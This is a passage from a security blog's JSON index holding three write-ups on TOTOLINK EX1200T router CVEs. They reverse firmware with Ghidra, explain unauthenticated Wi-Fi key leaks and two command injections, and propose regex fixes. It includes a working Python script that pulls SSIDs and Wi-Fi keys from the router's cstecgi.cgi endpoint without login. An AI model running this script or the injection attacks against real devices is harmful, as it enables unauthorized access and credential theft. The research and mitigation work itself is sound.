*)&amp;local_7c,\"%s;%s;%s\",&amp;local_94,&amp;local_8c,&amp;local_84);   uVar3 = cJSON_CreateString(acStack_d4);   cJSON_AddItemToObject(uVar1,\"authMode\",uVar3);   uVar3 = cJSON_CreateString(&amp;local_7c);   cJSON_AddItemToObject(uVar1,\"encrypType\",uVar3);   uVar3 = cJSON_CreateNumber(0,0x40080000);   cJSON_AddItemToObject(uVar1,\"bssidNum\",uVar3);   SetWlan_idx(&amp;local_210);   if (iVar2 == 0) {     apmib_get(0xfa,&amp;local_5c);     apmib_get(0xfb,&amp;local_13c);   }   else {     apmib_get(0xfc,&amp;local_5c);     apmib_get(0xfd,&amp;local_13c);   }   uVar5 = FUN_00020b20(local_5c);   uVar3 = cJSON_CreateNumber((int)uVar5,(int)((ulonglong)uVar5 &gt;&gt; 0x20));   cJSON_AddItemToObject(uVar1,\"apcliEnable\",uVar3);   uVar3 = cJSON_CreateString(&amp;local_13c);   cJSON_AddItemToObject(uVar1,\"apcliSsid\",uVar3);   uVar3 = getAuthMode(&amp;local_210);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"apcliAuthMode\",uVar3);   uVar3 = getEncrypType(&amp;local_210);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"apcliEncrypType\",uVar3);   uVar3 = getWirelessKey(&amp;local_210);   uVar3 = cJSON_CreateString(uVar3);   cJSON_AddItemToObject(uVar1,\"apcliKey\",uVar3);   getWlBssInfo(&amp;local_210,auStack_58);   sprintf((char *)&amp;local_118,\"%02X:%02X:%02X:%02X:%02X:%02X\",(uint)local_55,(uint)local_54,           (uint)local_53,(uint)local_52,(uint)local_51,(uint)local_50);   uVar3 = cJSON_CreateString(&amp;local_118);   cJSON_AddItemToObject(uVar1,\"apcliBssid\",uVar3);   iVar2 = getRepeaterStatus(&amp;local_210);   if (iVar2 == 1) {     uVar3 = cJSON_CreateString(\"success\");     cJSON_AddItemToObject(uVar1,\"apcliStatus\",uVar3);   }   else {     uVar3 = cJSON_CreateString(&amp;DAT_000218e4);     cJSON_AddItemToObject(uVar1,\"apcliStatus\",uVar3);   }   SetWlan_idx(&amp;local_238);   __ptr = (void *)cJSON_Print(uVar1);   websGetCfgResponse(param_1,param_3,__ptr);   free(__ptr);   cJSON_Delete(uVar1);   return 0; }   If we requested this function in the panel we can see the results clearly as the following:      Now, Let’s write a python code to exploit both functions and retrieve the leaked important information:   import requests import sys from json import *  def getWiFiApConfig(target):     url = f\"http://{target}/cgi-bin/cstecgi.cgi\"     headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\", \"Origin\": f\"http://{target}\", \"DNT\": \"1\", \"Connection\": \"close\", \"Referer\": f\"http://{target}/ap.asp?timestamp=1679528272527\"}     json={\"topicurl\": \"setting/getWiFiApConfig\"}     r = requests.post(url, headers=headers, json=json)     data = loads(r.text)     print(\"=========================================\")     print(\"[+] Access Point Information\")     print(\"SSID:\", data[\"ssid\"])     print(\"Key:\", data[\"key\"])     print(\"[+] 5G Access Point Information\")     print(\"SSID:\", data[\"ssid5g\"])     print(\"Key:\", data[\"key5g\"])  def getWiFiApInfo(target):     url = f\"http://{target}/cgi-bin/cstecgi.cgi\"     headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\", \"Origin\": f\"http://{target}\", \"DNT\": \"1\", \"Connection\": \"close\", \"Referer\": f\"http://{target}/ap.asp?timestamp=1679528272527\"}     json={\"topicurl\": \"setting/getWiFiApInfo\"}     r = requests.post(url, headers=headers, json=json)     data = loads(r.text)     print(\"=========================================\")     print(f\"[+] Access Point {data['ssid1']}\")     print(\"Key:\", data[\"wifiKey1\"])     print(\"Status:\", data[\"wifiOff1\"])     print(\"BSSID:\", data[\"bssid1\"])     print(f\"[+] Access Point {data['ssid2']}\")     print(\"Key:\", data[\"wifiKey2\"])     print(\"Status:\", data[\"wifiOff2\"])     print(\"BSSID:\", data[\"bssid2\"])     print(f\"[+] Access Point {data['ssid3']}\")     print(\"Key:\", data[\"wifiKey3\"])     print(\"Status:\", data[\"wifiOff3\"])     print(\"BSSID:\", data[\"bssid3\"])  target = sys.argv[1] method = int(sys.argv[2])  if method == 1:     print(f\"[*] Target: {target}  Method: getWiFiApConfig\")     getWiFiApConfig(target) elif method == 2:     print(f\"[*] Target: {target}  Method: getWiFiApInfo Status: (0 Means on/ 1 Means off)\")     getWiFiApInfo(target) else:     print(\"[-] Invalid Method number\")   Our code will take 2 parameters the target IP address and a method number (1 for getWiFiApConfig or 2 for getWiFiApInfo), Then It checks the method number and calls the appropriate function for each method. The getWiFiApConfig function retrieves the configuration information for both 2.4G and 5G Access Points, including SSID and key by sending a POST request to the target’s /cgi-bin/cstecgi.cgi with the topicurl parameter set to setting/getWiFiApConfig. After that parsing the JSON data in the response to retrieve the SSID and the key. The getWiFiApInfo function retrieves information for multiple access points, including SSID, key, status and BSSID by sending a POST request to the target’s /cgi-bin/cstecgi.cgi with the topicurl parameter set to setting/getWiFiApInfo. After that parsing the JSON data in the response to retrieve the SSID, key, status and BSSID.      Final Thoughts   As mostly of the vulnerabilities in this device model, There is nothing checks if the user is logged in or no &amp; has a valid session or no, So, It must contain a function to operate all of this and check it. Another thing is not to retrieve the keys of the APs until the user click on show password.   Conclusion   As we saw the functions that are responsible for retrieving the Access Points information and type of information each one bring to the device panel &amp; how it’s done, Also we wrote a code to exploit it and automate this process. Finally, The root cause and highlighted some suggestions to mitigate it.       References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_getWiFiApConfig_leak.md            https://github.com/p1Kk/vuln/blob/6b28edd65b7c2ce7d70d0aac8decd96ac50e5182/totolink_ex1200t_getWiFiApInfo_leak.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf      ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42889/",
        "teaser": "http://localhost:5000/assets/images/clfo9ai5b1x5i0jqi9v2s5juy.png"
      },{
        "title": "CVE-2021-42890: Hostime Remote Command Injection",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42889 which is a remote command injection through the HostTime parameter, As a results a malicious user can control the device and achieve remote command execution RCE. (Note:Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, The   refore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:      The Analysis   It’s the time for the analysis. We will need Burp Suite to see how is the request made that contains HostTime parameter where the command get injected. In the Time Setting Under Management tab, We can notice Copy PC's Time:      By clicking on it we can see the following request made to cstecgi.cgi:      Let’s go with Ghidra and reverse the cstecgi.cgi file. Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions. But, You can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one contains the NTPSyncWithHost by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"NTPSyncWithHost\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the word getWiFiApConfig and will print the results under the library name. Therefore, we will be able to know which library copy for us the device time or anything related. Command output:   Lib Name: app.so  Lib Name: cloudupdate.so  Lib Name: global.so  Lib Name: lan.so  Lib Name: product.so  Lib Name: system.so NTPSyncWithHost NTPSyncWithHost  Lib Name: upgrade.so  Lib Name: wireless.so  Lib Name: wps.so   And as we can see it’s with-in the system.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library with Ghidra. After opening the Functions tab under Symbol Tree we can notice the NTPSyncWithHost function:      So, We can say the flaw is as the following:      As we can see the function is a small function:      Now, Let’s understand what this function do and how it works. First the function start by taking 3 parameters:   void NTPSyncWithHost(undefined4 param_1,undefined4 param_2,undefined4 param_3)   Then, We can see Declare variables used within the function:     undefined4 uVar1;   FILE *__stream;   int iVar2;   char acStack_288 [256];   undefined4 local_188;   timeval local_184;   char acStack_17c [100];   char acStack_118 [256];           uVar1: an undefined4 type variable.            __stream: a pointer to a FILE object.            iVar2: an integer variable.            acStack_288: a character array of size 256.            local_188: an undefined4 type variable.            local_184: a timeval struct (used to represent time intervals).            acStack_17c: a character array of size 100.            acStack_118: a character array of size 256.       uVar1 = websGetVar(param_2,0x6110,0x6164); memset(acStack_17c,0,100); gettimeofday(&amp;local_184,(__timezone_ptr_t)0x0);   After that Call the websGetVar() function with parameters param_2, 0x6110, and 0x6164, then store the result in uVar1. The websGetVar function is used to get the value of a variable from a web form submitted by a user. The two hexadecimal values 0x6110 and 0x6164 are string pointers representing variable names, which the function will search for in the submitted form. memset() function is to fill the acStack_17c character array with 0's, initializing it with a size of 100. After that gettimeofday() function with the address of the local_184 timeval struct and a null timezone pointer ((__timezone_ptr_t)0x0) and get the current time and stores it in the timeval struct local_184. So, we can see that the uVar1 carry the value of HostTime parameter. Now, Let’s rename it to HostTime.     __stream = fopen((char *)0x611c,(char *)0x5db4);   if (__stream != (FILE *)0x0) {     fscanf(__stream,(char *)0x5e70,acStack_118);     iVar2 = atoi(acStack_118);     fclose(__stream);     sprintf(acStack_17c,(char *)0x6134,local_184.tv_sec - iVar2);     system(acStack_17c);   }   In these lines, the fopen() function is called with two parameters, (char *)0x611c and (char *)0x5db4 and these two hexadecimal values are string pointers representing the file name and the file opening mode, respectively. The function opens the specified file and returns a FILE pointer which is stored in the __stream variable. If the file cannot be opened, fopen() will return a null pointer, Then it checks if __stream is not equal to a null pointer ((FILE *)0x0). If it is not null, that means the file has been successfully opened and the code inside the if statement will be executed which is a call to fscanf() function to read data from the opened file __stream, The function reads data according to the format specified by the string pointer (char *)0x5e70 and stores the result in the acStack_118 character array. The format string is a string that specifies how the data should be parsed from the file. Then atoi() function to convert the string in acStack_118 to an integer and store the result in the iVar2 variable. Finally, Close the opened file by calling the fclose() function with the __stream parameter and call the sprintf() function to format a string and store it in acStack_17c variable &amp; Call the system() function to execute the value in acStack_17c variable. By moving to the following lines:   iVar2 = Validity_check(HostTime); if (iVar2 == 0) {     sprintf(acStack_288,(char *)0x6158,HostTime);     CsteSystem(acStack_288,0);     apmib_set(0x97,&amp;local_188);     apmib_update_web(4);     system((char *)0x6168);     websSetCfgResponse(param_1,param_3,0x5f40,0x5b88);     system((char *)0x6180); }   Here we can see Call the Validity_check() function with HostTime as a parameter, This function likely checks the validity of the NTP server address obtained from the web request and store the result in the iVar2 variable. After that the IF condition checks if iVar2 is equal to 0, If it is, this means the NTP server address is valid and the code inside the if statement will be executed. By using the sprintf() function to format a string and store it in the acStack_288 character array. The format string is specified by the string pointer (char *)0x6158 and the NTP server address HostTime is used as an argument to fill the placeholders in the format string, Then calling the CsteSystem() function with the acStack_288 character array and 0 as parameters and this function is a custom function made by the developer to run a system command to update the NTP server configuration with the user-specified server address which include our HostTime parameter value. After that, call apmib_set() function with 0x97 and the address of local_188 as parameters and sets a value in the Application MIB (Management Information Base) database. Call the apmib_update_web() function with 4 as a parameter to update the web-based configuration interface to reflect the changes made to the NTP server configuration. After all of this we can see that the issue occurs at the following lines:   sprintf(acStack_288,(char *)0x6158,HostTime);     CsteSystem(acStack_288,0);   As there is no filtration to the user input and the parameter value can be manipulated by the user. It’s time to exploit it. I connected the device through telnet services first:      Now, Let’s go to Burp Suite and manipulate the request and show a PoC for the vulnerability:      As we can see in the above screenshot we were able to execute the command successfully.   Final Thoughts   The developer shall use an Asp endpoint to operate the time on the device as a different option instead of executing commands to do it. But, In our case of this code there are many solutions to make sure it will be hard for the user to escape the default command and inject malicious command using regex to check for a valid date as the following:   void NTPSyncWithHost(undefined4 param_1,undefined4 param_2,undefined4 param_3)  {   undefined4 HostTime;   FILE *__stream;   int iVar1;   char acStack_288 [256];   undefined4 local_188;   timeval local_184;   char acStack_17c [100];   char acStack_118 [256];   regex_t regex;     int regex_status;   // Compile the regular expression     regex_status = regcomp(&amp;regex, \"^[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}$\", REG_EXTENDED);     if (regex_status) {         printf(\"Could not compile regex.\\n\");         return 1;     }         local_188 = 0;   HostTime = websGetVar(param_2,0x6110,0x6164);   memset(acStack_17c,0,100);   gettimeofday(&amp;local_184,(__timezone_ptr_t)0x0);   __stream = fopen((char *)0x611c,(char *)0x5db4);   if (__stream != (FILE *)0x0) {     fscanf(__stream,(char *)0x5e70,acStack_118);     iVar1 = atoi(acStack_118);     fclose(__stream);     sprintf(acStack_17c,(char *)0x6134,local_184.tv_sec - iVar1);     system(acStack_17c);   }   // Check if the HostTime variable matches the regex pattern   regex_status = regexec(&amp;regex, HostTime, 0, NULL, 0);     if (!regex_status) {       iVar1 = Validity_check(HostTime);       if (iVar1 == 0) {         sprintf(acStack_288,(char *)0x6158,HostTime);         CsteSystem(acStack_288,0);         apmib_set(0x97,&amp;local_188);         apmib_update_web(4);         system((char *)0x6168);         websSetCfgResponse(param_1,param_3,0x5f40,0x5b88);         system((char *)0x6180);   \t} else {             return 1;         }   }   return; }   Here we used regex to check the patterns of the date if it’s valid or no, If it’s not valid it will exit without executing anything. But, If it’s valid then it will execute the code normally.   Conclusion   In this analysis we had a look on CVE-2021-42890 and highlighted the issue made by the developer &amp; Provided a solution that can help in mitigating the issue. Finally, You could use any other decompiler other than Ghidra as it’s not making the codes more clear.       References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_hosttime_rce.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf      ","categories": ["IoT Exploitation"],
        "tags": [],
        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42890/",
        "teaser": "http://localhost:5000/assets/images/clfm149jg0ijy0jo32lrye520.png"
      },{
        "title": "CVE-2021-42885: deviceMac Remote Command Injection",
        "excerpt":"Introduction   A vulnerability discovered in TOTOLINK EX1200T model known as CVE-2021-42885 which is a remote command injection through the deviceMac parameter, As a results a malicious user can control the device and achieve remote command execution RCE. (Note:Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions)   Obtaining the Firmware   Before we start we would need the firmware of the device, therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is V4.1.2cu.5215 and we have many ways to do it:           You can search for the firmware on the official website for the vendor.            Download it from any other source (after someone already dump it from the device and published it).            Dump the firmware through UART, You could read a detailed blog from Here.            Also, you could contact the support to provide you with the firmware.            Finally dumping the firmware using CH341A Mini programmer USB, You could read a detailed blog from Here.       In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using binwalk tool as the following binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" and here is the output:   $ ls TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web $ sudo binwalk -e --run-as=root \"TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web\" [sudo] password for azima:  DECIMAL       HEXADECIMAL     DESCRIPTION -------------------------------------------------------------------------------- 76            0x4C            JFFS2 filesystem, little endian 209052        0x3309C         Zlib compressed data, compressed 209388        0x331EC         Zlib compressed data, compressed 210144        0x334E0         Zlib compressed data, compressed 210832        0x33790         JFFS2 filesystem, little endian 231428        0x38804         Zlib compressed data, compressed 231988        0x38A34         Zlib compressed data, compressed 232548        0x38C64         Zlib compressed data, compressed 233116        0x38E9C         Zlib compressed data, compressed 233560        0x39058         JFFS2 filesystem, little endian 254344        0x3E188         Zlib compressed data, compressed 254696        0x3E2E8         JFFS2 filesystem, little endian 255224        0x3E4F8         Zlib compressed data, compressed 256064        0x3E840         JFFS2 filesystem, little endian 321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes   And as i am using Windows Subsystem Linux (WSL), Here we can browser our firmware normally:      The Analysis   It’s the time for the analysis.the request made that contains deviceMac parameter where the command get injected is as the following:   POST /cgi-bin/cstecgi.cgi HTTP/1.1 Host: 192.168.0.1 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8 If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT Connection: close Content-Length: 68  {\"topicurl\":\"setting/setDeviceName\", \"deviceMac\":\"Vulnerable\", \"deviceName\":\"1\"}   Let’s go with Ghidra and reverse the cstecgi.cgi file. Now, By going to the file and check it with the file command, We can see it’s an ELF 32bit MIPS file:      Open it and create a new project i named it EX1200T for the device name and drop the cstecgi.cgi file into the project:      After that open the file using Code Browser within Ghidra:      Then, analysis the file:      Navigating to Symbol Tree and let’s check out the functions:      After going through the functions clearly inside FUN_00400dd8 function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:      We just can see that httpStatus, redirectURL &amp; responseParam being passed to some unclear functions. But, You can see under \\squashfs-root\\lib\\cste_modules folder that there are libraries named as the following:   app.so cloudupdate.so global.so lan.so product.so system.so upgrade.so wireless.so wps.so   After reversing this libraries you will know that it’s clearly used by the cstecgi.cgi to perform different operations and changes through the device panel. Let’s identify which one contains the deviceMac by searching through the following Bash one liner using strings command:   for i in $(ls -la | awk '{print $9}' | grep \".so\"); do echo \"\"; echo \"Lib Name: $i\"; strings $i | grep \"deviceMac\"; done   The above line will print the library name after this will run the strings command on the library to get any string has the word deviceMac and will print the results under the library name. Therefore, we will be able to know which library could has the vulnerable code or anything related. Command output:   Lib Name: app.so  Lib Name: cloudupdate.so  Lib Name: global.so ,{\"deviceMac\":\"%s\",\"deviceName\":\"%s\"} deviceMac  Lib Name: lan.so  Lib Name: product.so  Lib Name: system.so  Lib Name: upgrade.so  Lib Name: wireless.so  Lib Name: wps.so   And as we can see it’s with-in the global.so library, As we did with the cstecgi.cgi file. Let’s do the same with the library with Ghidra. After opening the Functions tab under Symbol Tree we can notice the setDeviceName function:      So, We can say the flaw is as the following:      Now, Let’s understand what this function do and how it works. First the function start by taking 3 parameters:   undefined4 setDeviceName(undefined4 param_1,undefined4 param_2,undefined4 param_3)   After that the following lines declaring variables:              char cVar1: This declares a variable cVar1 of type char.            bool bVar2: This declares a variable bVar2 of type bool.            char *pcVar3: This declares a variable pcVar3 of type char *, which is a pointer to a character.            char *pcVar4: This declares a variable pcVar4 of type char *, which is also a pointer to a character.            int iVar5: This declares a variable iVar5 of type integer.            FILE *__stream: This declares a variable __stream of type FILE *, which is a pointer to a FILE type used for input/output operations.            size_t sVar6: This declares a variable sVar6 of type size_t, which is an unsigned integer type. It’s commonly used to represent sizes of objects.            char *pcVar7: This declares a variable pcVar7 of type char *, which is another pointer to a character.            char *__s: This declares a variable __s of type char *, which is a pointer to a character.            char acStack_1138 [127]: This declares an array acStack_1138 of 127 characters. This array is allocated on the stack.            char acStack_10b9 [129]: This declares another array acStack_10b9 of 129 characters. This array is also allocated on the stack.            char local_1038 [32]: This declares an array local_1038 of 32 characters. This array is also allocated on the stack.            char local_1018 [4064]: This declares an array local_1018 of 4064 characters. This array is also allocated on the stack.            char *local_38: This declares a variable local_38 of type char *, which is yet another pointer to a character.            char *local_34: This declares a variable local_34 of type char *, which is also a pointer to a character.            char *local_30: This declares a variable local_30 of type char *, which is also a pointer to a character.       Then, When it comes to line 22 we can see the following calls for functions:      The memset() function is used to initialize arrays to a specific value for the acStack_1138 array with zeros and has a size of 0x80 (128 bytes) &amp; acStack_10b9 array, starting from the second element acStack_10b9 + 1 with zeros and has a size of 0x80 (128 bytes). Then, initializes the local_1038 array with zeros and has a size of 0x1000 (4096 bytes). Finally, retrieves a value of the parameter deviceMac from the web request and stores it in pcVar3 and retrieves a value of the parameter deviceName from the web request and stores it in pcVar4. So, Let’s rename the pcVar3 to deviceMac &amp; pcVar4 to deviceName. At the end executes a shell command using the system() function and the command being executed is /bin/jffs2.sh 1 2&gt; /dev/null, Let’s connect to the router and check the file and what is it do. I connected the device through telnet services:      And as we can see here is the file:      When we cat the file we can get it’s content as the following:   #!/bin/sh # # script file to mount userdata.jffs2 # # Usage: jffs2.sh {mtdname} #  umount /dev/mtdblock2 2&gt;/dev/null  sleep 1  if [ $1 -eq 1 ]; then         mount -t jffs2 /dev/mtdblock2 /mnt -o rw 2&gt;/dev/null else         mount -t jffs2 /dev/mtdblock2 /mnt -o ro 2&gt;/dev/null fi  if [ $? -ne 0 ]; then          if [ $1 -eq 1 ]; then                 mount -t jffs2 /dev/mtdblock2 /mnt -o rw 2&gt;/dev/null         else                 mount -t jffs2 /dev/mtdblock2 /mnt -o ro 2&gt;/dev/null         fi          if [ $? -ne 0 ]; then                 if [ $1 -eq 1 ]; then                         mount -t jffs2 /dev/mtdblock2 /mnt -o rw 2&gt;/dev/null                 else                         mount -t jffs2 /dev/mtdblock2 /mnt -o ro 2&gt;/dev/null                 fi                  if [ $? -ne 0 ]; then                         echo \"mount invalid! erase mtd and mount again!\"                         sysconf mtd_erase                 fi         fi fi   The script attempts to unmount any existing file system on /dev/mtdblock2. Any error messages produced by the command are discarded and waits for 1 second.After that checks the value of the argument $1. If it is equal to 1, the file system is mounted as read-write (-o rw option). Otherwise, it is mounted as read-only (-o ro option), Then checks the exit status of the previous command. If it is not equal to 0, the mount operation failed. If the mount operation failed, the script attempts to mount the file system again, up to three times. If the mount operation still fails after three attempts, the script outputs an error message and runs the command sysconf mtd_erase which erase the memory technology device (mtd) and mount the file system again. By moving on with the following lines:      the code checks for the existence of a file /mnt/customDeviceName, opens it, reads its contents, and performs some operations on the data. if the file /mnt/customDeviceName exists and is readable. If it does, access() returns 0, and iVar5 is set to 0. and if we go to the device again we can see that the file contains the data we send in the request:      After that checks if access() succeeded in finding the file. If the file exists,It opens the file for reading and if the file was successfully opened, a loop that reads lines from the file using fgets() and stores it in the buffer __s, Then performs some operations on the data until there are no more lines to read.After that strlen(__s) determines the length of the string read by fgets() and acStack_10b9[sVar6] sets the null terminator at the end of the string in the acStack_10b9. Then, checks if the second character in acStack_10b9 is not null and if the string contains a ,. If both conditions are met, the code extracts two strings from the line using strncpy() and strstr() &amp; as we can guess it’s the deviceMac,deviceName and formats them using snprintf(). Finally, stores them in the local_1038 array. If no matching string is found, the code formats the two variables deviceMac and deviceName using snprintf() and stores them in local_1038. Finally, the file is closed using fclose().      If access() doesn’t succeeded in finding the file creates a string containing a command that writes the values of deviceMac and deviceName to the file /mnt/customDeviceName and then execute the command system(acStack_1138). After that checks if the local_1038 array contains any data a loop that writes data to the file /mnt/customDeviceName using by executing command. The loop continues until the end of the local_1018 array is reached and then If iVar3 is 0, the loop writes the first value of local_1038 to the file using the &gt; redirection operator. Otherwise, it appends the value to the file using the &gt;&gt; redirection operator. So, as we can see clearly there is no input validation is done on the deviceMac &amp; deviceName which can be manpulated by the user. Now, It’s time for exploiting it. Opening Burp Suite and take the request to the repeater tab and start to reproduce the bug.      After we send the request we can see that the poc file created under /tmp directory if we open our device through telnet services again we can find the file:      Final Thoughts   The developer shall use an Asp endpoint to operate the save of the deviceMac on the device as a different option instead of executing commands to do it. But, In our case of this code there are many solutions to make sure it will be hard for the user to escape the default command and inject malicious command using regex to check for a valid MAC address as the following:   char *regex_pattern = \"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$\";      // Compile the regex pattern     regex_t regex;     int reti = regcomp(&amp;regex, regex_pattern, REG_EXTENDED);     if (reti != 0) {         fprintf(stderr, \"Failed to compile regex\\n\");         return 1;     }      // Execute the regex match     reti = regexec(&amp;regex, deviceMac, 0, NULL, 0);     if (reti == 0) {           system(\"/bin/jffs2.sh 1 2&gt; /dev/null\");   iVar3 = access(\"/mnt/customDeviceName\",0);   if (iVar3 == 0) {     __stream = fopen(\"/mnt/customDeviceName\",\"r\");     if (__stream != (FILE *)0x0) {       local_38 = local_1038;       bVar2 = false;       iVar3 = 0;       __s = acStack_10b9 + 1;       local_34 = \"%s,%s\";       while (pcVar5 = fgets(__s,0x80,__stream), pcVar5 != (char *)0x0) {         sVar4 = strlen(__s);         acStack_10b9[sVar4] = '\\0';         if ((acStack_10b9[1] != '\\0') &amp;&amp; (pcVar5 = strchr(__s,0x2c), pcVar5 != (char *)0x0)) {           local_30 = local_38;           strncpy(local_38,__s,0x20);           pcVar5 = strstr(local_38,deviceMac);           if (pcVar5 != (char *)0x0) {             snprintf(local_30,0x20,local_34,deviceMac,deviceName);             bVar2 = true;           }           iVar3 = iVar3 + 1;           local_38 = local_38 + 0x20;         }       }       if (!bVar2) {         snprintf(local_1038 + iVar3 * 0x20,0x20,\"%s,%s\",deviceMac,deviceName);       }       fclose(__stream);     }   }   else {     sprintf(acStack_1138,\"echo \\'%s,%s\\' &gt; /mnt/customDeviceName\",deviceMac,deviceName);     system(acStack_1138);   }   if (local_1038[0] != '\\0') {     iVar3 = 0;     deviceMac = local_1038;     deviceName = local_1018;     do {       if (iVar3 == 0) {         sprintf(acStack_1138,\"echo \\'%s\\' &gt; /mnt/customDeviceName\",deviceMac);       }       else {         sprintf(acStack_1138,\"echo \\'%s\\' &gt;&gt; /mnt/customDeviceName\",deviceMac);       }       system(acStack_1138);       iVar3 = iVar3 + 1;       cVar1 = *deviceName;       deviceMac = deviceName;       deviceName = deviceName + 0x20;     } while (cVar1 != '\\0');   }     } else {         return 1;     }   Here we used regex to check the patterns of the deviceMac if it’s valid or no, If it’s not valid it will exit without executing anything. But, If it’s valid then it will execute the code normally.   Conclusion   In this analysis we had a look on CVE-2021-42885 and highlighted the issue made by the developer &amp; Provided a solution that can help in mitigating the issue. Finally, You could use any other decompilers other than Ghidra as it’s not making the codes more clear.   References           https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html            https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_devicemac_rce.md            https://ghidra-sre.org/            https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf      ","categories": ["IoT Exploitation"],
        "tags": [],
